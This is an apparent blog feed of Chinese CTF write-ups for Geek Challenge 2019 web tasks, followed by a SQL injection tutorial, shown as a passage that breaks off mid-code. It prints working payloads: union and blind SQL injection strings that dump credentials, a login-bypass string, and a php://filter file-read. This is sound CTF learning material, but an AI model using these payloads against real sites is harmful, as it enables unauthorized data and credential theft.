    </entry>
    
    
    
    <entry>
      <title>python学习笔记</title>
      <link href="/2025/01/19/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2025/01/19/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>极客大挑战2019Http</title>
      <link href="/2025/01/09/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Http/"/>
      <url>/2025/01/09/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Http/</url>
      
        <content type="html"><![CDATA[<p>首先打开靶机，发现一个链接</p><p><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Http1.png"></p><p>进入发现是一个招新页面</p><p><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Http2.png"></p><p>查看源代码发现一个隐藏的超链接指向secret.php</p><p><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Http3.png"></p><p>点开发现显示我们不是从<a href="https://sycsecret.buuoj.cn跳转过来的/">https://Sycsecret.buuoj.cn跳转过来的</a></p><p><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Http4.png"></p><p>这时候就想到referer头的作用</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-keyword">Referer</span>头在HTTP请求中主要用于指示当前请求的来源页面，帮助服务器了解用户是从哪个页面跳转而来的‌<br></code></pre></td></tr></table></figure><p>使用hackbar修改Referer头,用burpsuite也可</p><p><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Http5.png"></p><p>修改完成后又显示请使用”Syclover” 浏览器</p><p><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Http6.png"></p><p>这时就想到user-agent的作用</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">User</span>-Agent（用户代理）在HTTP请求中起着重要作用，主要用于标识发送请求的客户端信息，包括网络、浏览器类型、版本号等‌。具体来说，<span class="hljs-keyword">User</span>-Agent的作用包括以下几个方面：‌<span class="hljs-number">12</span><br></code></pre></td></tr></table></figure><p>使用hackbar修改user-agent</p><p><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Http7.png"></p><p>重新打开网页又显示只能在本地阅读</p><p><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Http8.png"></p><p>这时就想到x-forwarded-for</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm">X-Forwarded-For（XFF）的作用主要是帮助服务器获取通过HTTP代理或负载均衡方式连接到Web服务器的客户端的原始<span class="hljs-built_in">IP</span>地址<br></code></pre></td></tr></table></figure><p>使用hackbar修改X-Forwarded-For为127.0.0.1或者localhost</p><p><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Http9.png"></p><p>得到flag</p><p><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Http10.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 做题笔记 </tag>
            
            <tag> http协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>极客大挑战2019SecretFile</title>
      <link href="/2025/01/09/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019SecretFile/"/>
      <url>/2025/01/09/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019SecretFile/</url>
      
        <content type="html"><![CDATA[<p>首先打开题目，啥也没发现</p><p><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019SecretFile1.png"></p><p>检查源代码，发现一个Archive_room.php，点击看看</p><p><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019SecretFile2.png"></p><p>出现一个点击按钮，点击看看</p><p><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019SecretFile3.png"></p><p>除此之外没有别的线索了</p><p><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019SecretFile4.png"></p><p>按照提示回到上一个页面抓包，发现一个新的php</p><p><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019SecretFile5.png"></p><p>进去之后就是如下代码。</p><p><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019SecretFile6.png"></p><p>接下来代码审计</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>secret<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="language-xml"></span><span class="language-php"><span class="hljs-meta">&lt;?php</span></span><br><span class="language-php">    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);</span><br><span class="language-php">    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);</span><br><span class="language-php">    <span class="hljs-variable">$file</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];</span><br><span class="language-php">    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;../&quot;</span>)||<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;tp&quot;</span>)||<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;input&quot;</span>)||<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;data&quot;</span>))&#123;</span><br><span class="language-php"><span class="hljs-comment">//strstr()和stristr()都用于在一个较长的字符串中搜索指定的子字符串，</span></span><br><span class="language-php"><span class="hljs-comment">//并返回从该子字符串第一次出现的位置开始到字符串末尾的部分。</span></span><br><span class="language-php"><span class="hljs-comment">//两者区别在于前者对大小写敏感，后者对大小写不敏感</span></span><br><span class="language-php"><span class="hljs-comment">//即程序过滤了 ../ tp input data</span></span><br><span class="language-php">        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Oh no!&quot;</span>;</span><br><span class="language-php">        <span class="hljs-keyword">exit</span>();</span><br><span class="language-php">    &#125;</span><br><span class="language-php">    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>); </span><br><span class="language-php"><span class="hljs-comment">//flag放在了flag.php里</span></span><br><span class="language-php"><span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml">这是很明显的文件包含漏洞</span><br></code></pre></td></tr></table></figure><p>发现没有过滤掉flag，尝试一下file&#x3D;flag.php，发现确实进去了但是不显示</p><p><img src="/../image/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019SecretFile7.png"></p><p>发现没有过滤伪协议，伪协议以及文件包含漏洞相关知识：<a href="https://blog.csdn.net/m0_46467017/article/details/126380415">https://blog.csdn.net/m0_46467017/article/details/126380415</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">php://filter 读取源代码并进行<span class="hljs-built_in">base64</span>编码输出，不然会直接当做php代码执行就看不到源代码内容了<br></code></pre></td></tr></table></figure><p>于是构造payload如下：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">file</span>=php://<span class="hljs-built_in">filter</span>/<span class="hljs-built_in">read</span>=<span class="hljs-built_in">convert</span>.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><p>得到flag.php源码的base64加密：</p><p><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019SecretFile8.png"></p><p>将base64加密的源码解码得到flag：</p><p><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019SecretFile9.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 做题笔记 </tag>
            
            <tag> filter伪协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>极客大挑战2019LoveSQL</title>
      <link href="/2025/01/05/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019LoveSQL/"/>
      <url>/2025/01/05/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019LoveSQL/</url>
      
        <content type="html"><![CDATA[<p>首先判断闭合，发现只有单引号时才报错，所以可以判断为单引号闭合</p><p><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019LoveSQL1.png"></p><p>尝试一些经典的SQL注入</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">1<br>1<span class="hljs-string">&#x27;</span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span> = <span class="hljs-string">&#x27;1#</span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-attribute">1</span>=1#<br></code></pre></td></tr></table></figure><p>使用万能密码成功登录</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; or <span class="hljs-number">1</span>=<span class="hljs-number">1</span>#<br></code></pre></td></tr></table></figure><p><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019LoveSQL2.png"></p><p>先试一下是否是MD5加密，结果发现不是</p><p><a href="https://www.cmd5.com/">md5在线解密破解,md5解密加密</a></p><p>先用order by来查看他有多少列</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-number">1</span>’ <span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">4</span><span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p>报错了</p><p><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019LoveSQL4.png"></p><p>最终经过二分法测试有3列</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">3</span><span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p>正常回显</p><p><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019LoveSQL3.png"></p><p>查看回显位有哪些</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>#<br></code></pre></td></tr></table></figure><p><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019LoveSQL5.png"></p><p>查看库名</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-number">-1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-built_in">database</span>(),<span class="hljs-number">3</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019LoveSQL6.png"></p><p>也可以爆库</p><figure class="highlight capnproto"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs capnproto"><span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">union</span> select <span class="hljs-number">1</span>,group_concat(schema_name),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.schemata<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019LoveSQL7.png"></p><p>查看表名</p><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs q"><span class="hljs-number">1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> <span class="hljs-built_in">where</span> table_schema=&#x27;geek&#x27;#<br><br>或者爆表<br><span class="hljs-number">1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> <span class="hljs-built_in">where</span> table_schema=database()#<br></code></pre></td></tr></table></figure><p><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019LoveSQL8.png"></p><p>查看两个表的列名</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">查看第一个表<br><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;</span>geekuse<span class="hljs-string">r&#x27;#</span><br><span class="hljs-string"></span><br><span class="hljs-string">查看第二个表</span><br><span class="hljs-string">1&#x27;</span> union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns where table_schema=database() <span class="hljs-keyword">and</span> table_name=<span class="hljs-string">&#x27;l0ve1ysq1&#x27;</span><span class="hljs-comment">#</span><br>发现两表结果相同<br></code></pre></td></tr></table></figure><p><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019LoveSQL9.png"></p><p>查看id，username，password的内容</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-number">1</span>&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(<span class="hljs-built_in">id</span>,username,password) <span class="hljs-keyword">from</span> geekuser<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019LoveSQL10.png"></p><p>查看另一个表的id，username，password的内容</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-number">1</span>&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(<span class="hljs-built_in">id</span>,username,password) <span class="hljs-keyword">from</span> l0ve1ysq1<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019LoveSQL11.png"></p><p>得到了flag</p>]]></content>
      
      
      
        <tags>
            
            <tag> 做题笔记 </tag>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>极客大挑战2019Havefun</title>
      <link href="/2025/01/05/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Havefun/"/>
      <url>/2025/01/05/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Havefun/</url>
      
        <content type="html"><![CDATA[<p>首先查看源码</p><p><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Havefun1.png"></p><p>发现此处有被注释掉的代码</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml"><span class="hljs-comment">&lt;!--</span></span><br><span class="hljs-comment"><span class="language-xml">        $cat=$_GET[&#x27;cat&#x27;];</span></span><br><span class="hljs-comment"><span class="language-xml">        echo $cat;</span></span><br><span class="hljs-comment"><span class="language-xml">        if($cat==&#x27;dog&#x27;)</span></span><span class="hljs-template-variable">&#123;</span><br><span class="hljs-template-variable">            echo &#x27;Syc&#123;cat_cat_cat_cat&#125;</span><span class="language-xml"><span class="hljs-comment">&#x27;;</span></span><br><span class="hljs-comment"><span class="language-xml">        &#125;</span></span><br><span class="hljs-comment"><span class="language-xml">        --&gt;</span></span><br></code></pre></td></tr></table></figure><p>然后构造payload</p><p>Payload：中文 ’ 有效载荷 ‘，指成功exploit之后，攻击代码释放的具有攻击能力的能够实现攻击者目的的代码。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">/?<span class="hljs-attribute">cat</span>=dog<br></code></pre></td></tr></table></figure><h5 id="直接在网页地址栏中构造payload"><a href="#直接在网页地址栏中构造payload" class="headerlink" title="直接在网页地址栏中构造payload"></a>直接在网页地址栏中构造payload</h5><p><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Havefun2.png"></p><p>这样就能得到flag了</p><p><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Havefun3.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 做题笔记 </tag>
            
            <tag> payload构造 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>极客大挑战2019EasySQL</title>
      <link href="/2025/01/05/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019EasySQL/"/>
      <url>/2025/01/05/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019EasySQL/</url>
      
        <content type="html"><![CDATA[<p>首先进入题目网站，发现输入框，根据题目可以得知应该要SQL注入</p><p><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019EasySQL1.png"></p><p>测试后发现单引号会报错，而双引号，括号和不闭合都不会报错，只会显示名称密码错误，可以得知闭合方式为单引号，字符注入</p><p><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019EasySQL2.png"></p><p>接下来只需要简单的SQL注入语句 admin’ or 1&#x3D;1就可以得到flag</p><p><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019EasySQL3.png"></p><p>这样这题就解开了。</p><p>原理：在数据库中形成的 sql 语句是 <code>SELECT * FROM table_name WHERE username=&#39;admin&#39; and password=&#39;123456&#39;;</code>使用万能密码并且用#将后面的语句注释掉就行了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 做题笔记 </tag>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入</title>
      <link href="/2025/01/03/sql%E6%B3%A8%E5%85%A5/"/>
      <url>/2025/01/03/sql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="SQL注入基础"><a href="#SQL注入基础" class="headerlink" title="SQL注入基础"></a>SQL注入基础</h2><h3 id="什么是注入"><a href="#什么是注入" class="headerlink" title="什么是注入"></a>什么是注入</h3><p>概念：所谓SQL注入，就是通过把SQL命令插入到WEB表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令，从而进一步得到相应的数据信息。</p><h3 id="注入分类"><a href="#注入分类" class="headerlink" title="注入分类"></a>注入分类</h3><p>按照查询字段：</p><p>字符型：当输入的参数为字符串时，称为字符型</p><p>数字型：当输入的参数为整形时，可以认为是数字型注入</p><p>按照注入方法：<br>Union注入，报错注入，布尔注入，时间注入</p><h3 id="注入点"><a href="#注入点" class="headerlink" title="注入点"></a>注入点</h3><p>概念：注入点就是可以实行注入的地方，通常是一个访问数据库的连接。</p><p><a href="https://blog.csdn.net/Jaasenyi/article/details/113648313">https://blog.csdn.net/Jaasenyi/article/details/113648313</a></p><h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><ol><li>查找注入点</li><li>判断是字符型还是数字型注入 and 1&#x3D;1    1&#x3D;2&#x2F;     3-1</li><li>如果是字符型，找到他的闭合方式，’  “  ‘)  “)</li><li>判断查询列数，group by    order by</li><li>查询回显位置，-1</li></ol><h2 id="UNION注入"><a href="#UNION注入" class="headerlink" title="UNION注入"></a>UNION注入</h2><p><img src="/../image/%E6%8B%BF%E5%88%B0%E8%A1%A8%E5%90%8D%E5%92%8C%E5%88%97%E5%90%8D.png"></p><p>查库名</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> <span class="hljs-built_in">schema_name</span> <span class="hljs-keyword">from</span> information_schema.schemata<br></code></pre></td></tr></table></figure><p>查某库的数据表</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> <span class="hljs-built_in">table_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=’xxxxx’<br></code></pre></td></tr></table></figure><p>查某表的所有列</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> <span class="hljs-built_in">column_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=’xxxxx’<br></code></pre></td></tr></table></figure><p>查某列的内容</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> *** <span class="hljs-keyword">from</span> ***<br><br>插入&quot;~&quot;区分数据<br><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(username,<span class="hljs-string">&#x27;~&#x27;</span>,<span class="hljs-keyword">password</span>),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> users <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h3 id="group-concat-的作用"><a href="#group-concat-的作用" class="headerlink" title="group_concat()的作用"></a>group_concat()的作用</h3><p>确保所有查询信息能放到一行显示出来</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">例如查表名<br><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">table_name</span>),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema = <span class="hljs-string">&#x27;xxx&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="/../image/group_concat.png"></p><h3 id="搜索型注入"><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a>搜索型注入</h3><p>搜索型即模糊匹配在 MySQL 中的模糊匹配符号是%所以注入时要加上%其它同理</p><h3 id="XX型注入"><a href="#XX型注入" class="headerlink" title="XX型注入"></a>XX型注入</h3><p>字符型注入的一种只是闭合符不同</p><h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><p>盲注的分类</p><p><img src="/../image/%E7%9B%B2%E6%B3%A8%E5%88%86%E7%B1%BB.png"></p><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>布尔盲注的条件</p><p><img src="/../image/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E6%9D%A1%E4%BB%B6.png"></p><p>闭合符号判断</p><p><img src="/../image/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E9%97%AD%E5%90%88%E7%AC%A6%E5%88%A4%E6%96%AD.png"></p><p>关键函数</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">ascii</span><span class="hljs-params">()</span></span>可以把字母转换为对应的数字<br><span class="hljs-function"><span class="hljs-title">ord</span><span class="hljs-params">()</span></span>返回第一个字符的ascii码<br><br><span class="hljs-function"><span class="hljs-title">substr</span><span class="hljs-params">(()</span></span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)将()从第一个字符开始一次显示一个字符<br>例如：<br>将查到的库名从第一个字符开始显示一个字符<br><span class="hljs-function"><span class="hljs-title">substr</span><span class="hljs-params">((select database()</span></span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<br>查库名的第二个字符<br><span class="hljs-function"><span class="hljs-title">substr</span><span class="hljs-params">((select database()</span></span>),<span class="hljs-number">2</span>,<span class="hljs-number">1</span>)<br>组合使用<br><span class="hljs-function"><span class="hljs-title">ascii</span><span class="hljs-params">(substr((select database()</span></span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)) &gt;= <span class="hljs-number">100</span><br><br><span class="hljs-function"><span class="hljs-title">mid</span><span class="hljs-params">()</span></span>用法和<span class="hljs-built_in">substr</span>()一致<br><br><br><span class="hljs-function"><span class="hljs-title">length</span><span class="hljs-params">()</span></span>返回字符的长度<br>例如：<br>将查到的库名去猜库名的长度为<span class="hljs-number">8</span>然后通过判断页面是否为真来猜长度<br><span class="hljs-function"><span class="hljs-title">length</span><span class="hljs-params">(database()</span></span>) = <span class="hljs-number">8</span><br><br><span class="hljs-function"><span class="hljs-title">left</span><span class="hljs-params">(database()</span></span>,<span class="hljs-number">1</span>)和substr差不多，表示显示从左边开始第一位的字符<br><br>获取第二个表<br><span class="hljs-function"><span class="hljs-title">ascii</span><span class="hljs-params">(substr((select table_name from information_schema.tables where table_schema = database()</span></span> limit <span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">113</span>--+<br><br>limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>表示从第<span class="hljs-number">0</span>个开始获取第一个<br>所有 limit <span class="hljs-number">1</span>,<span class="hljs-number">1</span>就表示获取第二个<br></code></pre></td></tr></table></figure><p>为什么要把字母转换成数字?</p><p>因为查询命令可以执行，但不会返回信息到页面</p><p><img src="/../image/ascii.png"></p><p>通过二分法比大小去猜字母</p><p><img src="/../image/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E6%93%8D%E4%BD%9C.png"></p><p>正则注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 